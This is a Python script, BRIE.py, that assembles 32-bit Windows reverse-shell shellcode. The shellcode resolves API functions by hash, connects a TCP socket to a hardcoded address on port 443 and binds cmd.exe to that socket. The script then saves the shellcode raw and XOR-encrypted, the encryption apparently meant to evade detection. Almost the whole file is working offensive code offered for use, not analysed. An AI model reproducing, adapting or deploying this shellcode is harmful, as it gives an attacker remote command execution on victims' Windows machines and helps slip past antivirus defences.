#!/usr/bin/python
#
# BRIE.py - 32-bit Windows Reverse Shell Shellcode Generator
# Based on SWISS.py (x64) but adapted for x86.
#
# The high DWORD is the IPv4 address in little-endian, followed by the 2-bytes port in little-endian, and the 2-bytes address family.

import ctypes, struct
from keystone import *

CODE = (
'''
start:
    # Save stack pointer
    mov ebp, esp
    sub esp, 1000                       # Reserve space on stack

    # --------------------------------------------------------------------------
    # 1. Resolve kernel32.dll Base Address
    # --------------------------------------------------------------------------
resolve_kernel32:
    xor ecx, ecx
    mov esi, fs:[ecx + 0x30]            # ESI = PEB
    mov esi, [esi + 0x0c]               # ESI = PEB->Ldr
    mov esi, [esi + 0x1c]               # ESI = PEB->Ldr.InInitOrder (first list entry)
    
search:
    mov ebx, [esi + 0x08]               # EBX = DllBase (kernel32 will be here eventually)
    mov edi, [esi + 0x20]               # EDI = BaseDllName.Buffer (Unicode string)
    mov esi, [esi]                      # ESI = Next entry (Flink)
    
    cmp word ptr [edi + 24], cx         # Compare 12th wchar (offset 24) with 0
    jne search
    cmp byte ptr [edi], 0x4B            # Compare 1st wchar with 'K'
    jne search

    # Found kernel32.dll, Base in EBX.

    # --------------------------------------------------------------------------
    # 2. Symbol Resolution Helpers (Get Address of find_function)
    # --------------------------------------------------------------------------
find_function_jmp:
    jmp callback                        # Jump to callback

get_find_function_addr:
    pop esi                             # PC of find_function in ESI
    mov [ebp - 4], esi                  # Save find_function address in local var
    jmp resolve_k32_sym                 # Continue

callback:
    call get_find_function_addr         # Call back, pushing PC

    # --------------------------------------------------------------------------
    # 3. function: find_function
    # Input: EBX = DllBase
    # Stack: [RetAddr] [Hash1] [Hash2] ...
    # Output: Replaces Hashes on Stack with Func Addresses
    # --------------------------------------------------------------------------
find_function:
    pusha                               # Save registers
    mov ebp, esp
    
    # Check Stack Arguments
    mov ecx, [esp + 36]                 # ECX = Count
    lea edi, [esp + 40]                 # EDI = Pointer to first Hash
    
    # EBX = Module Base
    mov eax, [ebx + 0x3c]               # EAX = e_lfanew
    mov esi, [ebx + eax + 0x78]         # ESI = Export Directory RVA
    add esi, ebx                        # ESI = Export Directory VA
    
    mov edx, [esi + 24]                 # EDX = NumberOfNames
    mov eax, [esi + 32]                 # EAX = AddressOfNames RVA
    add eax, ebx                        # EAX = AddressOfNames VA
    
find_function_next_limit:
    # Restore Export Directory info for search
    mov eax, [ebx + 0x3c]
    mov esi, [ebx + eax + 0x78]         # ESI = Export Dir
    add esi, ebx
    
    mov ecx, [esi + 24]                 # ECX = NumberOfNames
    mov eax, [esi + 32]                 # EAX = AddressOfNames RVA
    add eax, ebx                        # EAX = AddressOfNames VA

find_function_loop:
    jecxz find_function_not_found       # Safety
    dec ecx
    
    mov edx, [eax + ecx * 4]            # EDX = Name RVA
    add edx, ebx                        # EDX = Name VA
    
    # Hash Name in EDX
    push eax                            # Save AddressOfNames
    push ecx                            # Save Counter
    
    xor eax, eax
    xor ecx, ecx
hash_loop:
    ror ecx, 13
    mov al, [edx]
    add ecx, eax
    inc edx
    cmp al, 0
    jnz hash_loop
    
    # Hash in ECX. Compare with [EDI]
    cmp ecx, [edi]
    
    pop ecx                             # Restore Counter
    pop eax                             # Restore AddressOfNames
    
    jnz find_function_loop              # Next name
    
    # Found!
    # Resolve Address
    # ESI = Export Dir VA
    # ECX = Ordinal Index
    
    mov edx, [esi + 36]                 # AddressOfNameOrdinals RVA
    add edx, ebx                        # VA
    movzx ecx, word ptr [edx + ecx * 2] # Ordinal
    
    mov edx, [esi + 28]                 # AddressOfFunctions RVA
    add edx, ebx                        # VA
    mov edx, [edx + ecx * 4]            # Function RVA
    add edx, ebx                        # Function VA
    
    mov [edi], edx                      # Overwrite Hash with Address
    add edi, 4                          # Move to next Hash
    
    mov edx, [edi]
    cmp edx, -1
    jne find_function_next_limit        # Process next hash
    
    # Done.
    popa
    ret 4                               # Return and pop Count (4 bytes)

find_function_not_found:
    int3

    # --------------------------------------------------------------------------
    # 4. Resolve Kernel32 Symbols
    # --------------------------------------------------------------------------
resolve_k32_sym:
    push -1                             # Sentinel
    
    mov eax, 0x78b5b983                 # TerminateProcess
    push eax
    mov eax, 0x16b3fe72                 # CreateProcessA
    push eax
    mov eax, 0xec0e4e8e                 # LoadLibraryA
    push eax
    
    push 0                              # Dummy Count
    call [ebp - 4]                      # call find_function
    
    # Stack: [LoadLibraryA] [CreateProcessA] [TerminateProcess] [Sentinel]
    
    # --------------------------------------------------------------------------
    # 5. Load ws2_32.dll
    # --------------------------------------------------------------------------
load_ws2_32:
    # String "ws2_32.dll"
    push 0x00006c6c                     # ll
    push 0x642e3233                     # 32.d
    push 0x5f327377                     # ws2_
    push esp                            # Pointer to string
    call [esp + 16]                     # Call LoadLibraryA
    
    mov ebx, eax                        # Save ws2_32 Base
    add esp, 12                         # Clean string chars
    
    # --------------------------------------------------------------------------
    # 6. Resolve ws2_32 Symbols
    # --------------------------------------------------------------------------
resolve_ws2_sym:
    push -1                             # New Sentinel
    mov eax, 0x3bfcedcb                 # WSAStartup
    push eax
    mov eax, 0xadf509d9                 # WSASocketA
    push eax
    mov eax, 0x60aaf9ec                 # connect
    push eax
    
    push 0                              # Dummy Count
    
    # EBX is ws2_32 base
    call [ebp - 4]                      # call find_function
    
    # Stack: [connect] [WSASocketA] [WSAStartup] [Sentinel] ...
    
    # --------------------------------------------------------------------------
    # 7. WSAStartup
    # --------------------------------------------------------------------------
call_WSAStartup:
    sub esp, 400                        # WSAData struct
    mov eax, esp                        # lpWSAData
    push eax
    push 0x202                          # wVersionRequested
    call [esp + 416]                    # Call WSAStartup
    
    add esp, 400                        # Clean WSAData
                                        
    # --------------------------------------------------------------------------
    # 8. WSASocketA
    # --------------------------------------------------------------------------
call_WSASocketA:
    push 0                              # dwFlags
    push 0                              # g
    push 0                              # lpProtocolInfo
    push 6                              # protocol (TCP)
    push 1                              # type (SOCK_STREAM)
    push 2                              # af (AF_INET)
    call [esp + 28]                     # Call WSASocketA
                                        
    mov esi, eax                        # Save Socket in ESI
    
    # --------------------------------------------------------------------------
    # 9. connect
    # --------------------------------------------------------------------------
call_connect:
    push 0x9d2da8c0                     # IP
    push 0xbb010002                     # Port
    mov ecx, esp                        # sockaddr ptr
    
    push 16                             # namelen
    push ecx                            # name
    push esi                            # s
    call [esp + 20]                     # Call connect
                                        
    add esp, 8                          # Clean sockaddr
    
    # --------------------------------------------------------------------------
    # 10. CreateProcessA
    # --------------------------------------------------------------------------
create_process:
    # Need STARTUPINFOA (0x44 bytes)
    sub esp, 68                         # Allocate 68 bytes
    mov edi, esp                        # EDI = STARTUPINFO
    
    # Zero init
    xor eax, eax
    mov ecx, 17                         # 68 / 4 = 17 dwords
    rep stosd
    
    mov edi, esp                        # Reset EDI
    mov byte ptr [edi], 68              # cb = 68
    mov dword ptr [edi + 44], 0x101     # dwFlags = STARTF_USESTDHANDLES | ...
    mov [edi + 56], esi                 # hStdInput = Socket
    mov [edi + 60], esi                 # hStdOutput
    mov [edi + 64], esi                 # hStdError
    
    # Push "cmd"
    push 0x00646d63                     # "cmd\0"
    mov ebx, esp                        # CmdLine ptr
    
    # CreateProcessA Args
    sub esp, 16                         # lpProcessInformation
    mov ecx, esp                        
    
    push ecx                            # lpProcessInformation
    push edi                            # lpStartupInfo
    push 0                              # lpCurrentDirectory
    push 0                              # lpEnvironment
    push 0                              # dwCreationFlags
    push 1                              # bInheritHandles
    push 0                              # lpThreadAttributes
    push 0                              # lpProcessAttributes
    push ebx                            # lpCommandLine
    push 0                              # lpApplicationName
    
    call [esp + 148]                    # Call CreateProcessA
    
    # --------------------------------------------------------------------------
    # 11. TerminateProcess
    # --------------------------------------------------------------------------
call_TerminateProcess:
    push 0                              # uExitCode
    push -1                             # hProcess
    call [esp + 112]                    # Call TerminateProcess

'''
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding: 
 instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
 
print(f"Size: {len(encoding)} bytes.")

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
    
# save raw shellcode
with open("shellcode.bin", "wb") as f:
    f.write(sh)
print("[+] Raw shellcode saved to shellcode.bin")

# enc with XOR
key = b"Gdb1p_dnbp1DD@#"
enc_sh = bytearray()
shellcode_bytes = bytearray(sh)

for i in range(len(shellcode_bytes)):
    enc_sh.append(shellcode_bytes[i] ^ key[i % len(key)])

with open("enc_shellcode.bin", "wb") as f:
    f.write(enc_sh)

print(f"[+] Encrypted shellcode saved to enc_shellcode.bin")
